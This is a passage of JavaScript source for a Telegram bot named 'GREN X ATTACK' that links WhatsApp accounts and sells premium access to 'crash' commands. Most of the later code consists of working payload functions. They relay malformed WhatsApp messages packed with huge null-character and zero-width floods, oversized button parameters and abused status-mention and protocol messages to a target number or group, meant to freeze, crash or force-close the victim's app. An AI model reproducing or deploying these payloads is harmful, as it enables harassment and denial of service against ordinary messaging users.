      console.log(`⚔️ Menghubungkan Shinobi WhatsApp: ${botNumber}...`);
      const sessionDir = createSessionDir(botNumber);
      
      const credsPath = path.join(sessionDir, 'creds.json');
      if (!fs.existsSync(credsPath)) {
        console.log(`⚠️ File creds.json tidak ditemukan untuk ${botNumber}. Lewati.`);
        continue;
      }

      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

      sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
      });

      await new Promise((resolve, reject) => {
        sock.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === "open") {
            console.log(`✅ ${botNumber} berhasil menyatu dengan medan perang! 🥷`);
            sessions.set(botNumber, sock);
            resolve();
          } else if (connection === "close") {
            const shouldReconnect =
              lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
              console.log(`🔁 Mengulangi ritual sambungan untuk ${botNumber}...`);
              await initializeWhatsAppConnections();
            } else {
              reject(new Error("⛩️ Sambungan ditutup permanen oleh Takdir."));
            }
          }
        });

        sock.ev.on("creds.update", saveCreds);
      });
    }
  } catch (error) {
    console.error("💥 Kesalahan saat mengaktifkan koneksi Shinobi:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
 ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ :  ${botNumber}.....
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\` ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ : ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴘᴀɪʀɪɴɢ\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\` ᴘᴀɪʀɪɴɢ sᴜᴄᴄᴇs ɴᴏᴍᴏʀ ${botNumber}\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "THUNDERM");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\` ᴘᴀɪʀɪɴɢ ʙᴏᴛ \`\`\`
ᴄᴏᴅᴇ ᴘᴀɪʀɪɴɢ : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ : ${botNumber}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//~Runtime🗑️🔧


//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now



function getRandomImage() {
  const images = [
        "https://files.catbox.moe/iht2jc.jpg",
        "https://files.catbox.moe/iht2jc.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}


// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ Bukan";
  }
}

// Handle polling error
bot.on('polling_error', (error) => {
    if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
        console.log('⚠️ Konflik polling terdeteksi. Coba restart bot.');
        bot.stopPolling();
        setTimeout(() => bot.startPolling(), 5000);
    } else {
        console.error('Polling error:', error);
    }
});

// Helper function untuk delay
bot.onText(/\/XGren/, async (msg) => {
  if (!checkPremiumGroupAccess(msg)) {
    return bot.sendMessage(msg.chat.id, "❌ Grup ini tidak memiliki akses premium. Hubungi @GrenTzy.");
  }
  if (onlyGroup && msg.chat.type === "private") {
    return bot.sendMessage(msg.chat.id, "❌ Bot hanya bisa digunakan di grup saat ini.");
  }

  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();

  // Kirim stiker (tidak berubah)
  const stickerFileIds = [
    "CAACAgUAAxkBAAIvFGo4nqtIuOA0A8zar-njBEzirAtVAALJIAAC7ivJVZIysV9ydlxFPAQ",
    "CAACAgIAAxkBAAItpWo3wxE3HpdsVgGafR_djbFFe1GjAAKmAAP3AsgPqwzk86kqxlg8BA",
    "CAACAgIAAxkBAAItmWo3wrpMUAp3V4EuEpCm_0J5LpGjAAKFDQACGuZxS5jlJgLHLq6dPAQ",
    "CAACAgIAAxUAAWo3w0qSEnBPK2Krt5vOan06R-4WAAIyAAMNttIZjp82CVF_9hQ8BA",
    "CAACAgIAAxkBAAItqGo3w0PoZM7EQKKm5F0SwcbgcDgTAAIkAAMNttIZxX1_YZrhtt88BA"
  ];

  for (const fileId of stickerFileIds) {
    let stickerMsg;
    try {
      stickerMsg = await bot.sendSticker(chatId, fileId);
    } catch (err) {
      console.error(`Gagal kirim stiker ${fileId}:`, err.message);
      continue;
    }
    if (stickerMsg) {
      await new Promise(resolve => setTimeout(resolve, 2500));
      try {
        await bot.deleteMessage(chatId, stickerMsg.message_id);
        console.log(`✅ Stiker ${fileId} berhasil dihapus setelah 10 detik.`);
      } catch (err) {
        console.error(`Gagal hapus stiker ${fileId}:`, err.message);
      }
    }
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  // Caption dengan format <pre> (monospace)
  const caption = `
<pre>
GREN X ATTACK
𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯

⌑ Developer : @GrenTzy
⌑ Version : 5.3
⌑ Prefix : / ( slash )
⌑ Language : JavaScript

info premium
⌑ Status Premium : ${premiumStatus}
⌑ Username : ${username}
⌑ User Id : ${senderId}
⌑ Runtime : ${runtime}
</pre>
`;

  // Menu options
  const options = {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⚡ 𝙏𝙀𝘼𝙈 𝙂𝙍𝙀𝙉 𝙓", callback_data: "thanksto", style: "danger" },
          { text: "👑 𝙊𝙒𝙉𝙀𝙍 𝘼𝙆𝙎𝙀𝙎", callback_data: "akses", style: "danger" }
        ],
        [
          { text: "💀 𝙈𝙀𝙉𝙐 𝙂𝙍𝙀𝙉 𝙓", callback_data: "crash_menu", style: "primary" }
        ],
        [
          { text: "☠️ 𝙄𝙉𝙁𝙊 𝘾𝙍𝙀𝘼𝙏𝙊𝙍", url: "https://t.me/GrenTzy", style: "success" }
        ]
      ]
    }
  };

  // Kirim media acak (video atau foto) dari getRandomMedia()
  const media = getRandomMedia();
  if (media.type === "video") {
    await bot.sendVideo(chatId, media.url, options);
  } else {
    await bot.sendPhoto(chatId, media.url, options);
  }
});

// PAGINATION STATE & DATA
const userPage = new Map();

const crashList = [
    { cmd: "/HarimauCombo", desc: "🐯 Harimau combo", example: "/HarimauCombo 628123456789" },
    { cmd: "/fcNoClickFreeze", desc: "❄️ NoClick Freeze", example: "/fcNoClickFreeze 628123456789" },
    { cmd: "/BlankClickGren", desc: "💣 BlankClickGren", example: "/BlankClickGren 628123456789" },
    { cmd: "/Belum ada", desc: "💣 kosong", example: "belum ada 628123456789" }
];
const ITEMS_PER_PAGE_CRASH = 3;

// === Fungsi showCrashMenu (dengan video support) ===
async function showCrashMenu(chatId, messageId, media, page) {
    const totalPages = Math.max(1, Math.ceil(crashList.length / ITEMS_PER_PAGE_CRASH));

    if (page < 0) page = 0;
    if (page >= totalPages) page = totalPages - 1;

    const start = page * ITEMS_PER_PAGE_CRASH;
    const end = start + ITEMS_PER_PAGE_CRASH;
    const items = crashList.slice(start, end);

    let caption = `<pre>
  GREN X ATTACK 
     𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯

/harimaucombo      ➕ Delay X Freeze
/fcnoclickfreeze   ➕ NoClick Freeze
/blankclickgren    ➕ BlankClickGren
/forceclose        ➕ ForceClose no click
/delayv1           ➕ Invisible hard jamin C1 V1
/delayv2           ➕ Invisible hard jamin C1 V2
/delayv3           ➕ Delay duratin bebas spam
/FcNoClick           ➕ fc no click

📌 *BUG GROUP* 📌
/CrashXGroup       🌐 https:// (target grup)
</pre>`;

    const navButtons = [];
    if (page > 0) navButtons.push({ text: "◀️ SEBELUMNYA", callback_data: "prev_crash" });
    if (page < totalPages - 1) navButtons.push({ text: "BERIKUTNYA ▶️", callback_data: "next_crash" });

    const inlineKeyboard = [
        ...(navButtons.length ? [navButtons] : []),
        [{ text: "🔙 KEMBALI KE MENU", callback_data: "back_to_main" }]
    ];
    const replyMarkup = { inline_keyboard: inlineKeyboard };

    let userData = userPage.get(chatId) || {};
    userData.crash = page;
    userPage.set(chatId, userData);

    try {
        await bot.editMessageMedia(
            { type: media.type, media: media.url, caption: caption, parse_mode: "HTML" },
            { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
        );
    } catch (err) {
        console.error("Gagal edit menu crash:", err.message);
    }
}

// Fungsi untuk menampilkan menu
async function showAksesMenu(chatId, messageId, media, page) {
  let caption = "";
  let replyMarkup = {};

  if (page === 0) {
    caption = `<pre>
GREN X OWNER MENU 
      𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯

/restartbot      ➕ Restart bot
/restartpanel    ➕ Restart panel
/addowner        ➕ Tambah owner
/delowner        ➖ Hapus owner
/cekowner        ➕ Daftar owner
/onlygc          ➕ Mode only group
/addbot          ➕ Add sender tunggal
/toupload        ➕ Upload foto ke catbox
/emojiid         ➕ Cek ID emoji premium
/stickerid       ➕ Cek ID stiker

📌 *GRUP PREMIUM*
/addpremgrup     ➕ Tambah grup premium
/delpremgrup     ➖ Hapus grup premium
/premgroup       ⚙️ On/Off mode grup premium
</pre>`;
  } else if (page === 1) {
    caption = `<pre>
  GREN X OWNER MENU 
      𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯

/setpassword     ➕ Set password bot
/delpassword     ➕ Hapus password
/addtoken        ➕ Tambah token API
/deltoken        ➕ Hapus token API
/listakun        ➕ Daftar akun (GitHub)
/addakun         ➕ Tambah akun (GitHub)
/delakun         ➖ Hapus akun (GitHub)
/addprem         ➕ Tambah user premium
/delprem         ➕ Hapus user premium
/setjeda         ➕ Atur jeda anti spam
/addadmin        ➕ Tambah admin

📌 *FITUR LAIN* 📌
/XGren           ➕ Mulai bot
/antrian         ➖ Antrian testfunction
/cekfunc         ➕ Cek function
/addvvip         ➕ Tambah akses role VVIP
/delvvip         ➖ Hapus akses role VVIP
/listvvip        ➕ Cek list role VVIP
/addsender       ➕ Add multisender
/delsender       ➖ Delete sender
/listsender      ➕ List sender
/usesender       ➕ Use sender
</pre>`;
  } else if (page === 2) {
    caption = `<pre>
📌 *FITUR LAIN UDAH HADIR NIH DONGO😂*
/encrypthard      🔒 Encrypt medium - high
/encjapan        🇯🇵 Encrypt dengan gaya Japan
/encnew          🔒 Encrypt dengan metode New
/encquantum      🔒 Encrypt dengan Quantum
/encnova         🔒 Encrypt dengan Nova 
/encnebula       🔒 Encrypt dengan Nebula
/encarab         🇸🇦 Encrypt dengan gaya Arab
</pre>`;
  } else if (page === 3) {
    caption = `<pre>
 KATA KATA HARI INI
 HIDUP SEMENTARA 
 ML SELAMANYA
 
 TUKANG BAKSO MAKAN BAKWAN
 GUE GAK TAU KENAPA DIA MAKAN BAKWAN😂
</pre>`;
  }

  const navButtons = [];
  if (page > 0) {
    navButtons.push({ text: "◀️ SEBELUMNYA", callback_data: "prev_akses" });
  }
  if (page < 3) {
    navButtons.push({ text: "BERIKUTNYA ▶️", callback_data: "next_akses" });
  }

  const inlineKeyboard = [
    ...(navButtons.length ? [navButtons] : []),
    [{ text: "🔙 KEMBALI KE MENU", callback_data: "back_to_main" }]
  ];

  replyMarkup = { inline_keyboard: inlineKeyboard };

  let userData = userPage.get(chatId) || {};
  userData.akses = page;
  userPage.set(chatId, userData);

  try {
    await bot.editMessageMedia(
      { type: media.type, media: media.url, caption: caption, parse_mode: "HTML" },
      { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
    );
  } catch (err) {
    console.error("Gagal edit menu akses:", err.message);
  }
}


// MAIN CALLBACK
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const senderId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(senderId);
    const media = getRandomMedia();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "crash_menu") {
      let page = userPage.get(chatId)?.crash || 0;
      await showCrashMenu(chatId, messageId, media, page);
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "next_crash") {
      let page = (userPage.get(chatId)?.crash || 0) + 1;
      await showCrashMenu(chatId, messageId, media, page);
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "prev_crash") {
      let page = (userPage.get(chatId)?.crash || 0) - 1;
      await showCrashMenu(chatId, messageId, media, page);
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "akses") {
      let page = userPage.get(chatId)?.akses || 0;
      await showAksesMenu(chatId, messageId, media, page);
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "next_akses") {
      let page = (userPage.get(chatId)?.akses || 0) + 1;
      await showAksesMenu(chatId, messageId, media, page);
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "prev_akses") {
      let page = (userPage.get(chatId)?.akses || 0) - 1;
      await showAksesMenu(chatId, messageId, media, page);
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "thanksto") {
      caption = `<pre>
TEAM GREN X
𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯

  *CREATOR* 
• @GrenTzy (Owner & Developer)

🛠️ *SUPPORTER* 🛠️
• Ajaymelll (Hosting)
• Zamz (Tester)
• Ruxzs R7 (Tester)
• Ucup (Tester)
• Habibi (Hosting)

Terima kasih atas dukungannya!
</pre>`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "🔙 KEMBALI KE MENU", callback_data: "back_to_main" }]
        ]
      };
      await bot.editMessageMedia(
        { type: media.type, media: media.url, caption, parse_mode: "HTML" },
        { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
      );
      return bot.answerCallbackQuery(query.id);
    } else if (query.data === "back_to_main") {
      caption = `<pre>
   GREN X ATTACK 
      𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯
⌑ Developer : @GrenTzy
⌑ Version : 5.3
⌑ Prefix : / ( slash )
⌑ Language : JavaScript

info premium 
⌑ Status Premium : ${premiumStatus}
⌑ Username : ${username}
⌑ User Id : ${senderId}
⌑ Runtime : ${runtime}
</pre>`;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "⚡ 𝙏𝙀𝘼𝙈 𝙂𝙍𝙀𝙉 𝙓", callback_data: "thanksto", style: "danger" },
            { text: "👑 𝙊𝙒𝙉𝙀𝙍 𝘼𝙆𝙎𝙀𝙎", callback_data: "akses", style: "primary" }
          ],
          [
            { text: "💀 𝙈𝙀𝙉𝙐 𝙂𝙍𝙀𝙉 𝙓", callback_data: "crash_menu", style: "success" }
          ],
          [
            { text: "☠️ 𝙄𝙉𝙁𝙊 𝘾𝙍𝙀𝘼𝙏𝙊𝙍", url: "https://t.me/GrenTzy", style: "danger" }
          ]
        ]
      };
      await bot.editMessageMedia(
        { type: media.type, media: media.url, caption, parse_mode: "HTML" },
        { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
      );
      return bot.answerCallbackQuery(query.id);
    }

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
    bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan, coba lagi nanti.", show_alert: false });
  }
});

//Tempat function 
async function GrenXHarimauCombo(sock, target) {
  const Gren1 = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Bismillah gacor 🥰",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "cta_url",
            paramsJson: `{"flow_cta":"${"\u0000".repeat(999999) + "\n"}"}`
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "\u800b/\n/\u200b"
          }
        }
      }
    }
  };

  const Gren2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "GrenXHarimauVV5" + "\n".repeat(250000)
          },
          footer: {
            text: "By @GrenTzy"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({ display_text: "OK", url: "https://example.com" })
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, {
    protocolMessage: {
      type: 11,
      contextInfo: {
        forwardingScore: 9741,
        isForwarded: true,
        forwardedAIBotMessageInfo: {
          botName: "MetaAi",
          botJid: ["13135550202@s.whatsapp.net"],
          creatorName: "@GrenTzy"
        }
      }
    }
  }, {
    participant: { jid: target }
  });

  const type = ["call_permission_request", "audio_button", "sticker_button"];

  for (const x of type) {
    const enty = Math.floor(Math.random() * type.length);
    const GrenX = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "GrenXharimauDelay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_url",
              paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
              url: "https://mmg.whatsapp.net",
              merchantUrl: "t.me/GrenTzy",
              entryPointConversionSource: type[enty],
              version: 3
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            contextInfo: {
              stickerMessage: {
                paymentInviteMessage: {
                  serviceType: 4,
                  expiryTimestamp: Date.now() + 9007199254740991
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, GrenX, {
      participant: { jid: target }
    });
  }

  await sock.relayMessage(target, Gren1, {
    participant: { jid: target }
  });

  await sock.relayMessage(target, Gren2, {
    participant: { jid: target }
  });

  console.log("tutor comboin function");
}

async function fcNoClickFreeze(sock, target) {
    const Gren = {
        interactiveMessage: {
            body: { text: "GrenXHarimauV3" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "\u0000".repeat(20000),
                            sections: [
                                {
                                    title: "\u200b".repeat(15000),
                                    rows: [
                                        {
                                            rowId: "\u600b".repeat(10000),
                                            title: "\u800b".repeat(12000),
                                            description: "\u0000".repeat(8000)
                                        }
                                    ]
                                }
                            ]
                        })
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u0000".repeat(30000),
                            url: "https://mmg.whatsapp.net" + "\u0000".repeat(20000)
                        })
                    }
                ]
            },
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { text: "\u200b".repeat(10000) },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "\u0000".repeat(10000)
                                    })
                                }
                            ]
                        }
                    }
                },
                isForwarded: true,
                forwardingScore: 999
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("FC no click new x freeze sent");
}

async function BlankClickGren(sock, target) {
    const message = {
        interactiveMessage: {
            header: { title: "GrenTzy" },
            body: { text: "kontol" },
            footer: { text: "tak ada yang paling indah" },
            nativeFlowMessage: {
                buttons: [
                    { 
                        name: "quick_reply", 
                        buttonParamsJson: JSON.stringify({ 
                            display_text: "\u0000".repeat(50000) + "\u0600".repeat(50000), 
                            id: "\u200b".repeat(60000) 
                        }) 
                    }
                ]
            }
        }
    };
    await sock.relayMessage(target, message, {});
}

async function GrenTzy(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "GrenXHarimauV3",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});
    
    await sock.relayMessage(target, msg.message, {
  requestPaymentMessage: {
    currencyCodeIso4217: "IDR",
    amount1000: "9999",
    requestFrom: target,
    noteMessage: {
      extendedTextMessage: {
        text: msg, 
      }
    },
    expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
    amount: {
      value: 1000,
      offset: 1000,
      currencyCode: 'IDR'
    },
    background: {
      id: '1',
      color1: 0xff075e54,
      color2: 0xff128c7e,
      angle: 45
    },
    paymentStatus: 1,
    expiry: 86400,
    externalPaymentId: "123BCD",
    collectMessage: {
      text: "\u0000"
    },
    interstitial: {
      paymentMethod: true,
      installmentOptions: {
        maxInstallments: 999
      }
    }
  }
}, {
  participant: { jid: target }
});

    console.log(`Allhamdulillah Kekirim${target}`);

  } catch (error) {
    console.error(`Error${error.message}`);
  }
}

async function GrenDelayXharimauV1(sock, target) {
  const type = ["call_permission_request", "audio_button", "sticker_button"];

  for (const x of type) {
    const enty = Math.floor(Math.random() * type.length);
    const GrenX = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "GrenXharimauDelay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_url",
              paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
              url: "https://mmg.whatsapp.net",
              merchantUrl: "t.me/GrenTzy",
              entryPointConversionSource: type[enty],
              version: 3
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            contextInfo: {
              stickerMessage: {
                paymentInviteMessage: {
                  serviceType: 4,
                  expiryTimestamp: Date.now() + 9007199254740991
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, GrenX, { participant: { jid: target } });
  }

  console.log(`💀 GrenXharimau nih dek hati-hati wa lu gak bisa ngapa-ngapain 💀`);
}

async function GrenDelayHarimau(sock, target) {
    const Gren = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "GrenXharimauDelay",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "cta_url",
                        paramsJson: `{"flow_cta":"${"\u0000".repeat(999999) + "\n"}"}`,
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "\u200b/\n/\u300b"
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("ahhhh terkirim ke target🤧");
}

async function CrashGren(sock, groupJid) {
    const targetJid = groupJid.includes('@') ? groupJid : groupJid + '@g.us';
    const Gren = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Save gue @GrenTzy teman lu"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(60900),
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "GrenTzy Kicau kicau mania",
                                    url: "{\"display_text\":\"ⓘ ⸸GrenTzy\",\"url\":\"http://wa.me/stickerpack/GrenTzy\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,GrenTzy\"}"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{ icon: 'DOKUMENT' }`.repeat(60900)
                            }
                        ]
                    },
                    contextInfo: {
                        quotedMessage: {
                            extendedTextMessage: {
